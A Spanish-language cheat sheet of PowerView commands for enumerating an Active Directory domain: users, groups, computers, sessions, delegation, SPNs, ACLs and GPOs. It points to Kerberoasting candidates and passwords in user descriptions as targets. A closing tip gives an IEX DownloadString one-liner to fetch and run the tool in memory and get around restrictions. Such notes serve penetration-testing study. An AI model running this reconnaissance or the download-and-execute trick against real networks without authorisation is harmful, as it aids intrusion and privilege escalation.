## 🧠 Importar PowerView

```powershell
# Importar el módulo
Import-Module .\PowerView.ps1
```

---

## 🏢 Información del Dominio

```powershell
# Información del dominio actual
Get-Domain

# Controladores de dominio
Get-DomainController

# Políticas del dominio
Get-DomainPolicy

# Forest actual
Get-Forest

# Trusts (confianzas entre dominios)
Get-DomainTrust

# Obtener Dominio

Get-NetDomain
```

---

## 👤 Usuarios

```powershell
# Listar todos los usuarios
Get-DomainUser

# Información detallada de un usuario específico
Get-DomainUser -Identity juanperez

# Buscar usuarios con contraseñas no expiran
Get-DomainUser -Properties "PasswordNeverExpires" | Where-Object {$_.PasswordNeverExpires -eq "True"}

# Buscar usuarios con la opción "No puede cambiar contraseña"
Get-DomainUser -Properties "CannotChangePassword" | Where-Object {$_.CannotChangePassword -eq "True"}

# Enumerar Usuarios especificos

Get-NetUser

Get-NetUser | select cn

Get-NetUser | select cn,pwdlastset,lastlogon
```

---

## 👥 Grupos

```powershell
# Listar todos los grupos
Get-DomainGroup

# Miembros de un grupo
Get-DomainGroupMember -Identity "Administradores del dominio"

# Buscar grupos con miembros externos (interdominio)
Get-DomainForeignGroupMember

# Listar grupos especificos:
Get-NetGroup <opciones>

Get-NetGroup | select cn

Get-NetGroup "Sales Department" | select member

```

---

## 🗅️ Máquinas del Dominio

```powershell
# Enumerar todos los equipos unidos al dominio
Get-DomainComputer

# Equipos Windows 10
Get-DomainComputer | Where-Object {$_.OperatingSystem -like "*Windows 10*"}

# Equipos con sesiones activas
Get-NetSession -ComputerName <nombre_equipo>
```

---

## 🧑‍💼 Administradores de Máquina / Sesiones

```powershell
# Administradores locales de una máquina remota
Get-NetLocalGroup -ComputerName <nombre_equipo>

# Usuarios con sesión activa en un equipo remoto
Get-NetLoggedon -ComputerName <nombre_equipo>

# Ver usuarios que han iniciado sesión remotamente (sesiones SMB)
Get-NetSession -ComputerName <nombre_equipo>
```

---

## 🧬 Delegación y SPNs

```powershell
# Cuentas que tienen SPNs (candidatos para Kerberoasting)
Get-DomainUser -SPN

# Delegación sin restricciones
Get-DomainComputer -Unconstrained

# Delegación con restricciones (Resource-Based Constrained Delegation - RBCD)
Get-DomainComputer -TrustedToAuth
```

---

## 🧱 ACLs y permisos

```powershell
# Ver los permisos delegados en una OU
Get-DomainObjectAcl -Identity "OU=Marketing,DC=empresa,DC=local" -ResolveGUIDs

# Ver permisos en un usuario/grupo específico
Get-ObjectAcl -SamAccountName juanperez -ResolveGUIDs
```

---

## 📍 Buscar Objetivos Interesantes

```powershell
# Usuarios con posibles contraseñas en descripciones
Get-DomainUser -Properties description | Where-Object { $_.description -like "*pass*" }

# Buscar usuarios con propiedad "adminCount" (indica pertenencia a grupos privilegiados)
Get-DomainUser -Properties adminCount | Where-Object { $_.adminCount -eq 1 }

# Enumerar GPOs del dominio
Get-DomainGPO

# Buscar GPOs linkeadas a OUs específicas
Get-DomainOU -Properties gplink
```

---

## 💡 Tips

- Bajo restricciones, ejecutar PowerView de forma "reflectiva" (sin importar el módulo directamente) usando técnicas como `Invoke-Expression` o `IEX (New-Object Net.WebClient).DownloadString(...)`.
- Uso de `-SearchBase` para limitar el scope de búsqueda a una OU específica.
- Uso de `-LDAPFilter` para búsquedas más precisas.


